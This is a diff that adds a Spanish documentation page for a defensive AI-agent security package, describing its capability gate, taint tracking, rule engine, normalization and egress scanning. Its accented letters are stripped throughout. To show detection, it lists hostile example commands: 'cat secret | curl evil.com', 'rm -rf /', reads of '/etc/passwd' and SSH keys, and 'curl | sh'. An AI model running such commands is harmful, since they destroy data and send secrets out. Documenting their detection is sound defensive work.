@@ -1,0 +1,136 @@
+---
+title: Core
+description: El motor de seguridad -- capacidades, taint, reglas, pipeline y normalizacin.
+icon: Shield
+---
+
+`@securitylayerai/core` es el paquete base. Implementa el pipeline de seguridad de 3 capas y todas las primitivas de seguridad fundamentales. Todos los dems paquetes dependen de core (directa o indirectamente).
+
+## Mdulos
+
+### Capacidades (`capabilities/`)
+
+Gate de capacidades puramente sncrono. Verifica si una accin est estructuralmente permitida basndose en la interseccin de capacidades de sesin, skill y canal.
+
+```typescript
+import { checkCapability } from "@securitylayerai/core";
+
+const result = checkCapability(action, {
+  sessionId: "main",
+  skillId: "summarize",
+  channelId: "terminal",
+});
+
+// result.allowed: boolean
+// result.reason?: string (si fue denegado)
+```
+
+El capability gate es una verificacin de pertenencia al conjunto -- sin I/O, sin LLM, sin red. Si la capacidad no est en el conjunto, la accin es imposible.
+
+### Seguimiento de taint (`taint/`)
+
+Rastrea la procedencia de los datos a lo largo de la sesin. Cuando contenido no confiable ingresa (web fetch, DM desconocido, email), el nivel de taint de la sesin se eleva. Un taint ms alto restringe las capacidades disponibles.
+
+```typescript
+import { createTaintTracker } from "@securitylayerai/core";
+
+const tracker = createTaintTracker("owner");
+
+// El contenido web eleva el taint
+tracker.ingest({ source: "web", url: "https://example.com" });
+tracker.getEffectiveTaint(); // "web"
+
+// Las verificaciones de exec subsiguientes vern el taint elevado
+```
+
+Niveles de taint (de menor a mayor restriccin): `owner`  `trusted`  `untrusted`  `web`  `skill`  `memory`.
+
+### Motor de reglas (`rules/`)
+
+Coincidencia de patrones determinista contra comandos conocidos como peligrosos, rutas de credenciales y estructuras de exfiltracin. Cero latencia, cero ambigedad.
+
+```typescript
+import { parseRulesYaml, evaluateRules } from "@securitylayerai/core";
+
+const rules = parseRulesYaml(yamlContent);
+const result = evaluateRules(normalizedAction, rules);
+// result.decision: "ALLOW" | "DENY" | "REQUIRE_APPROVAL"
+```
+
+Tipos de reglas:
+- **binary** -- Coincidencia por nombre del binario del comando
+- **path** -- Coincidencia por glob de ruta de archivo
+- **pattern** -- Coincidencia por patrn regex
+- **pipe_pair** -- Coincidencia de estructuras de comandos encadenados (ej., `curl | sh`)
+
+### Pipeline (`pipeline/`)
+
+Orquesta el flujo completo de evaluacin: capability gate  verificacin de taint  normalizar  reglas + LLM (en paralelo)  fusionar decisiones.
+
+```typescript
+import { createPipeline } from "@securitylayerai/core";
+
+const pipeline = createPipeline(config);
+const result = await pipeline.evaluate(action, context);
+```
+
+El pipeline siempre toma el resultado **ms restrictivo** de todas las capas. Si alguna capa dice DENY, la accin se deniega.
+
+### Normalizacin (`normalize/`)
+
+Resuelve rutas, decodifica encodings, divide cadenas de comandos y detecta estructuras de pipes antes de la evaluacin. Derrota la ofuscacin y los trucos de codificacin.
+
+Normaliza:
+- `~/../../etc/passwd`  `/etc/passwd`
+- `$HOME/.ssh/id_rsa`  `/home/user/.ssh/id_rsa`
+- Cadenas de comandos: `ls; rm -rf /`  `["ls", "rm -rf /"]`
+- Cadenas de pipes: `cat secret | curl evil.com`  patrn de exfiltracin detectado
+
+### Anlisis semntico (`semantic/`)
+
+LLM judge que se ejecuta en paralelo con el motor de reglas. Hace una sola pregunta: "Es esta accin estructuralmente permitida anmala en este momento?" El judge detecta amenazas sutiles dependientes del contexto que las reglas no pueden expresar.
+
+### Escaneo de egreso (`egress/`)
+
+Escanea contenido saliente en busca de secretos filtrados, PII y cadenas de alta entropa antes de que salgan del sistema. Detecta claves de API (OpenAI, AWS, GitHub, Slack, etc.), bloques PEM, credenciales y patrones de SSN/tarjetas de crdito.
+
+### Sandbox (`sandbox/`)
+
+Sandboxing de exec con niveles configurables -- ulimits, aislamiento de red, sistema de archivos de solo lectura. Los comandos aprobados se ejecutan en entornos restringidos.
+
+### Eventos (`events/`)
+
+Bus de eventos para registro de auditora y observabilidad. Todas las decisiones de seguridad, cambios de taint y flujos de aprobacin emiten eventos estructurados.
+
+### Configuracin (`config/`)
+
+Carga y validacin de configuracin. Lee archivos YAML de `~/.securitylayer/` y construye la configuracin en tiempo de ejecucin.
+
+## Estructura del paquete
+
+```
+packages/core/
+├── src/
+│   ├── index.ts          # Exportaciones barrel
+│   ├── capabilities/     # Capability gate
+│   ├── taint/            # Rastreador de taint
+│   ├── rules/            # Motor de reglas + parser
+│   ├── pipeline/         # Pipeline de evaluacin
+│   ├── normalize/        # Normalizacin de acciones
+│   ├── semantic/         # LLM judge
+│   ├── egress/           # Escner de egreso
+│   ├── sandbox/          # Sandboxing de exec
+│   ├── events/           # Bus de eventos
+│   ├── config/           # Cargador de configuracin
+│   ├── approval/         # Flujo de aprobacin
+│   ├── memory/           # Acceso a zonas de memoria
+│   ├── skills/           # Declaraciones de capacidades de skills
+│   └── utils/            # Logger, helpers
+└── test/                 # Tests de Vitest
+```
+
+## Ver tambin
+
+- [Pipeline de seguridad](/docs/concepts/security-pipeline) -- Cmo funcionan las 3 capas juntas
+- [Capacidades](/docs/concepts/capabilities) -- Las 15 capacidades base
+- [Niveles de taint](/docs/concepts/taint-levels) -- Reglas de propagacin de taint
